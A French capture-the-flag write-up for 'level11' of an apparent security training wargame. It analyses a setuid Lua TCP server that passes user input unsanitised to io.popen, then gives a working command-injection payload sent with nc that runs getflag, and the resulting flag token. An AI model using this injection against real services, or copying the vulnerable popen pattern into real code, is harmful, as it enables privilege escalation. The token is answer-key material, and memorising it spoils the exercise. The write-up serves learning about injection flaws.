# [level11]

### Observations
##### J'affiche le programme '~/level11.lua':
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

##### Détails du programme:
```bash
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```

Je me rend compte que ce programme est exécuté par défaut en tant qu'utilisateur 'flag11' grâce à la commande:
```sh
ps aux | grep flag11
```

##### Entrées du programme:
```lua
string mot_de_passe
```

##### Fonctionnement:
Le programme est un serveur tcp qui tente de hasher la chaîne de caractères entrée par l'utilisateur. \
Il compare ensuite la chaîne hashée avec une chaîne prédefinie pour afficher différents messages inutiles. 

> Le serveur est hebergé sur l'addresse ip '127.0.0.1' avec le port '5151'.

> Le serveur est exécute en arriere-plan gràce a cron par defaut.

##### Conclusions:
La fonction hash a une vulnérabilité qui nous laisse exécuter du code shell comme nous le voulons. \
Vu que ce programme est exécuté par l'utilisateur 'flag11' par défaut nous pouvons avoir accès à son flag.

> La ligne suivante est la cause de la vulnérabilité: \
> prog = io.popen("echo "..pass.." | sha1sum", "r")

### Résolution
J'effectue une commande qui permet d'obtenir le résultat de la commande 'getflag' une fois dans le programme. \
Elle fonctionne car il suffit de créer un sous shell pour sortir de l'exécution classique du programme.\
Par la suite je redirige la sortie de cette dernière dans un fichier accessible car je ne pouvais pas la voir autrement.1 \
J'affiche ensuite le contenu de ce fichier.

#### commandes:
```sh
nc 127.0.0.1 5151 <<<'$(getflag >/tmp/OUTPUT)'
cat /tmp/OUTPUT
```

**token :** fa6v5ateaw21peobuub8ipe6s